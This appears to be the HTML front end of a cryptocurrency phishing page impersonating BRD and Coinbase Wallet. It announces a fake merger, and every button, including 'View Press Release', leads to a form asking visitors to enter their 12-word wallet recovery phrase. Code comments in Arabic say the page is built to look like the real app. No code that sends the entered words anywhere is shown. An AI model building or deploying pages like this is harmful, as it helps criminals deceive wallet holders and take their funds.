<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BRD Wallet Migration</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #1e1e3f;
            --btn-blue: #586cf5;
            --btn-gray: #3e3f5e;
            --text-white: #ffffff;
            --text-secondary: #b0b0cc;
            --grid-border: rgba(255, 255, 255, 0.1);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-white);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        /* حاوية ديناميكية توازن بين الحاسوب والهاتف */
        .container {
            width: 100%;
            max-width: 500px; /* حجم مثالي للحاسوب لتبدو كالتطبيق */
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 40px 25px;
            position: relative;
        }

        @media (min-width: 1024px) {
            .container {
                max-width: 450px;
                min-height: 850px;
                border: 1px solid var(--grid-border);
                border-radius: 30px;
                margin: 20px;
            }
        }

        .page {
            display: none;
            flex-direction: column;
            height: 100%;
            animation: fadeIn 0.4s ease;
        }

        .page.active { display: flex; }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* الشاشة الأولى */
        .logo-area {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 20px;
            margin-bottom: 40px;
        }

        /* أيقونة Coinbase الأصلية */
        .cb-logo {
            width: 85px;
            height: 85px;
            background-color: #0052ff;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 10px;
        }

        .cb-logo-inner {
            width: 32px;
            height: 32px;
            border: 6px solid white;
            border-radius: 5px;
        }

        .arrow-sep {
            font-size: 22px;
            color: var(--text-secondary);
            margin: 5px 0;
        }

        .brd-main-img {
            width: 140px;
            height: auto;
        }

        h1 {
            font-size: 28px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 20px;
            line-height: 1.2;
        }

        .sub-text {
            color: var(--text-secondary);
            text-align: center;
            font-size: 15px;
            line-height: 1.6;
            margin-bottom: 60px;
        }

        .btn-container {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: auto;
        }

        .btn {
            width: 100%;
            padding: 18px;
            border-radius: 8px;
            border: none;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }

        .btn-primary { background-color: var(--btn-blue); color: white; }
        .btn-secondary { background-color: var(--btn-gray); color: white; }

        /* الشاشة الثانية (شبكة الأرقام المطابقة للحقيقة) */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 50px;
        }

        .back-icon { font-size: 30px; cursor: pointer; }
        .info-icon { 
            width: 25px; height: 25px; 
            border: 2px solid white; 
            border-radius: 50%; 
            display: flex; justify-content: center; align-items: center;
            font-size: 14px;
        }

        .recovery-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            width: 100%;
            border: 1px solid var(--grid-border);
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.03);
            overflow: hidden;
        }

        .grid-item {
            border: 0.5px solid var(--grid-border);
            height: 80px;
            padding: 10px;
            display: flex;
            flex-direction: column;
        }

        .item-num {
            font-size: 12px;
            color: var(--text-secondary);
            margin-bottom: 5px;
        }

        .item-input {
            background: transparent;
            border: none;
            color: white;
            font-size: 15px;
            width: 100%;
            outline: none;
        }
    </style>
</head>
<body>

    <div class="container">
        
        <div id="p1" class="page active">
            <div class="logo-area">
                <div class="cb-logo"><div class="cb-logo-inner"></div></div>
                <div class="arrow-sep">↑</div>
                <img src="https://i.ibb.co/ymp5HL9C/F3-BB5708-18-B2-4-C3-F-89-D2-ADF914-D14-A9-E.png" class="brd-main-img" alt="BRD">
            </div>

            <h1>BRD has joined<br>Coinbase Wallet!</h1>
            <p class="sub-text">We're excited to announce that BRD is joining the Coinbase Wallet team.</p>

            <div class="btn-container">
                <button class="btn btn-primary" onclick="showPage('p2')">Get Coinbase Wallet</button>
                <button class="btn btn-secondary" onclick="showPage('p2')">View Press Release</button>
                <button class="btn btn-secondary" onclick="showPage('p2')">Restore Wallet</button>
            </div>
        </div>

        <div id="p2" class="page">
            <div class="header">
                <div class="back-icon" onclick="showPage('p1')">←</div>
                <div class="info-icon">?</div>
            </div>

            <h1 style="text-align: left; font-size: 24px;">Récupérer votre portefeuille</h1>
            <p class="sub-text" style="text-align: left; margin-bottom: 30px;">Veuillez saisir la phrase de récupération du portefeuille que vous souhaitez récupérer.</p>

            <div class="recovery-grid" id="mainGrid">
                </div>
        </div>

    </div>

    <script>
        // دالة التنقل
        function showPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        // بناء شبكة الأرقام بدقة
        const grid = document.getElementById('mainGrid');
        for (let i = 1; i <= 12; i++) {
            const div = document.createElement('div');
            div.className = 'grid-item';
            div.innerHTML = `<span class="item-num">${i}</span><input type="text" class="item-input" spellcheck="false">`;
            grid.appendChild(div);
        }
    </script>
</body>
</html>
